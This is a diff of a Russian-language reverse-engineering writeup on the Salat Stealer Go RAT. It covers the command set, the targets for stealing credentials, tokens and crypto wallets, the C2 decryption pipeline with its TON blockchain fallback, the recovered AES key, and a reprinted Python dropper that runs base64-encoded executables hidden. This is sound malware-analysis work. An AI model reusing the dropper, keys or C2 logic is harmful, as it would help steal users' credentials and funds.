@@ -313,7 +313,182 @@ salat/screenshot.enumDisplayMonitors
 salat/screenshot.getDesktopWindow
 ```
 
-## Ключеевые артефакты
+---
+
+## НАХОДКИ
+
+### 1. main.dec — 6 режимов дешифровки
+
+Из дизассемблера `0x8d3170`:
+
+```
+режим 0 — nil
+режим 1 — AES-GCM-256
+режим 2 — XOR с предыдущим байтом
+режим 3 — XOR с ключом
+режим 4 — рекурсия: Mode 2 → Mode 3
+режим 5 — рекурсия: Mode 3 → Mode 2
+```
+
+Псевдокод:
+
+```go
+func dec(data []byte, mode int) []byte {
+    switch mode {
+    case 0: return nil
+    case 1: return aesGcm256(data, aesKey)
+    case 2: return xorPrev(data)
+    case 3: return xorKey(data, xorKey)
+    case 4: return dec(dec(data, 2), 3)
+    case 5: return dec(dec(data, 3), 2)
+    }
+}
+```
+
+### 2. main.doTask — 14 команд
+
+Из дизассемблера `0x8e2930`:
+
+```
+1  → Suicide()                        — самоуничтожение
+2  → chansend1(ack)                   — heartbeat/Ack
+3  → downloadFile + cmd.exe           — скачать и запустить
+4  → wsSess.Start()                   — WebSocket RAT-сессия
+5  → os_exec.Command()                — запуск процесса
+6  → downloadFile + updTaskStatus()   — скачать + обновить статус
+7  → sendScreen()                     — стриминг экрана
+8  → shellCommand()                   — интерактивный shell
+9  → Steal()                          — полный сбор данных
+a  → downloadFile + cmd.exe + Suicide() — скачать, запустить, удалиться
+b  → time.Sleep()                     — задержка
+c  → downloadFile + cmd.exe           — скачать и запустить
+d  → p2pSocks()                       — SOCKS5-прокси
+e  → executeCommand()                 — удалённое выполнение
+```
+
+### 3. main.Steal — полный список целей
+
+Из дизассемблера `0x8e5bd0`:
+
+```
+UserInformation.txt          — HWID, IP, isAdmin, разрешение экрана
+Monitor0.jpg … Monitor4.jpg  — до 5 скриншотов
+Browsers\Cookies.txt         — cookies (Chrome, Edge, Brave, Firefox)
+Browsers\Logins.txt          — логины и пароли
+Browsers\Autofills.txt       — автозаполнение
+Clients\DiscordTokens.txt    — токены Discord
+Clients\SteamTokens.txt      — токены Steam
+Clients\tdata                — Telegram-сессия
+Crypto\                      — MyMonero, Exodus, Electrum
+Extensions\                  — MetaMask, Phantom, TronLink, Rabby
+```
+
+### 4. main.getEp — пайплайн расшифровки C2
+
+```
+hex_decode → Mode 4 → hex_decode → Mode 1 (AES-GCM) → URL
+```
+
+### 5. main.getBC — RSA + TON-fallback
+
+Псевдокод:
+
+```go
+func getBC(arg int) []byte {
+    block := rsaBlocks[arg]           // 516 байт
+    x := bigInt(gb(block))            // key stream
+    n := bigInt(mode4(block))         // модуль
+    rsa := exp(x, 0x10001, n)         // RSA
+    return dec(dec(rsa, 4), 1)        // Mode 4 → AES-GCM
+}
+```
+
+### 6. main.tonResolve — TON blockchain falback
+
+```
+1. RSA-расшифровка двух блоков (0xc956a0, 0xc958a4)
+2. SHA-256("wallet")
+3. Построение TON Cell
+4. Сериализация в BOC
+5. POST-запрос на TON API (method=dnsresolve)
+6. Парсинг ответа (FromBOCMultiRoot)
+7. Извлечение адреса (LoadAddr → Address.String)
+```
+
+### 7. AES-ключ
+
+```
+Mode2(MD5("biba")) = 938587070d8f3f11351eb19e08ca3f74
+```
+
+Деривация из `main` @ `0x8d54c0`:
+
+```asm
+0x8d54e4  call main.md5str        ; MD5("biba")
+0x8d5508  call main.dec           ; Mode 2
+0x8d553f  mov [0xfaee28], edx     ; запись ключа
+```
+
+### 8. XOR-ключ - динамический
+
+Из `axt @ 0x00faee38`:
+
+```asm
+GetHWID 0x8d2cc7  mov eax, [0xfaee38]    ; чтение
+GetHWID 0x8d2cd0  mov [0xfaee38], edx    ; ЗАПИСЬ
+```
+
+`GetHWID` читает `MachineGuid` из реестра:
+
+```
+HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid
+```
+
+Потом прогоняет через `main.dec(mode=1)` и записывает в `0xfaee38`
+
+**XOR-ключ зависит от machineguid устройства**
+
+Так же эта часть является опровержением статьи от cybersecurity-see.com 
+<img src="Untitled.jpg" alt="Опровержение cybersecurity-see.com">
+
+### 9. 6 RSA-блоков
+
+| Адрес | Назначение |
+|-------|-----------|
+| `0xc94e90` | getBC arg=1 |
+| `0xc95094` | getBC arg=2 |
+| `0xc95298` | getBC arg=3 |
+| `0xc9549c` | getBC arg=4 |
+| `0xc956a0` | tonResolve #1 |
+| `0xc958a4` | tonResolve #2 |
+
+блок - 516 байт:
+- `+0x00`: маркер `a5 a7 a5 a5`
+- `+0x04`: 512 байт зашифрованных данных
+
+### 10. Python-загрузчик 
+
+```python
+def run_exe_from_b64(b64_data, wait=False):
+    raw = base64.b64decode(b64_data)
+    temp_dir = os.environ.get('TEMP', tempfile.gettempdir())
+    filename = os.path.join(temp_dir, f'tmp_{uuid.uuid4().hex[:8]}.exe')
+    f = open(filename, 'wb')
+    f.write(raw)
+    if wait:
+        subprocess.run([filename], shell=True, creationflags=134217728)
+    else:
+        subprocess.Popen([filename], shell=True, creationflags=134217728)
+    return filename
+
+if __name__ == '__main__':
+    path1 = run_exe_from_b64(EXE1_B64, wait=True)
+    path2 = run_exe_from_b64(EXE2_B64, wait=True)
+```
+
+---
+
+## Ключевые артефакты
 
 C2 endpoint:
 
@@ -321,7 +496,7 @@ C2 endpoint:
 GETbldpcnwincpugpumemadm[0]/saat/numMK:1//v10KEYkey'"'nil01_"
 ```
 
-RSA-публичный ключ (1024-bit):
+RSA ключ:
 
 ```
 MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCTJPWl2JbiGm5m/JFe2+V04s4xiCtCB+aljdutGzQkiCjbds0Di6uoxn4flbwAP3Xc1t0xssQVDG8mvAmrXBDwgolOEhHPMY8hP5/PjtLmuKfIOKKG0SKzRR60VckinIck799q3Hut1lr5o/qg78FBx5BGPg7I3+OguNL1iw8QIDAQAB
@@ -363,7 +538,7 @@ lsass.exe
 Metamask, TonKeeper, SuiWallet, Maiar, DEFI
 ```
 
-## нструменты анализа
+## Инструменты анализа
 
 ```
 GoReSym
@@ -371,75 +546,18 @@ Rizin
 pyinstxtractor
 upx
 strings
+ghidra
 ```
 
-## Метаданные образца
+## Предупреждение
 
-```
-Образец: payload_1.exe
-Размер: 3.5 MB (UPX), 12 MB (распакованный)
-Тип: PE32
-Go Build ID: soaSZ3gtdf5oZjHHPnzB/jbJqVBD1Wvb3uj4gNdCH/m0su5JzGJzWj-0qjn9aX/-nSasggksAZHPIgvCjcl
-Go Version: 1.24.0
-Arch: 386 (32-bit)
-OS: Windows
-```
+Материал предоставлен исключительно в образовательных и исследовательских целях.
+Автор не несёт ответственности за использование в противоправных целях.
 
-## вытащенный python загрузчик
+## Источники
 
-```
-def run_exe_from_b64(b64_data, wait = (False,)):
-    
-    try:
-        raw = base64.b64decode(b64_data)
-        temp_dir = os.environ.get('TEMP', tempfile.gettempdir())
-        filename = os.path.join(temp_dir, f'''tmp_{uuid.uuid4().hex[:8]}.exe''')
-        f = open(filename, 'wb')
-        f.write(raw)
-        
-        try:
-            None(None, None)
-        with None:
-            if not None:
-                
-                try:
-                    
-                    try:
-                        if wait:
-                            subprocess.run([
-                                filename], shell = True, creationflags = 134217728)
-                        else:
-                            subprocess.Popen([
-                                filename], shell = True, creationflags = 134217728)
-                        return filename
-                    except Exception:
-                        e = None
-                        e = None
-                        del e
-                        return None
-                        e = None
-                        del e
-
-
-
-
-
-if __name__ == '__main__':
-    path1 = run_exe_from_b64(EXE1_B64, wait = True)
-    path2 = run_exe_from_b64(EXE2_B64, wait = True)
-    return None
-54 _payload_temp.py
-
-```
-
-## предупреждение
-
-Материал предоставлен исключительно в образовательных и исследовательских целях
-Автор не несёт ответственности за использование в противоправных целях
-
-## В основану использованы данные источники
-
-https://github.com/kaandemir993/Salat-Stealer-Telegram-Proxy-Decoy-C2-Analysis
-https://darkatlas.io/blog/salat-stealer-analysis-go-based-rat-c2-resilience-and-info-stealing-capabilities
+- https://github.com/kaandemir993/Salat-Stealer-Telegram-Proxy-Decoy-C2-Analysis
+- https://darkatlas.io/blog/salat-stealer-analysis-go-based-rat-c2-resilience-and-info-stealing-capabilities
+- https://cybersecurity-see.com/emergence-of-salat-stealer-a-new-era-in-malware-threats/
 
 Благодарю dark atlas и kaandemir993 за предоставленную информацию
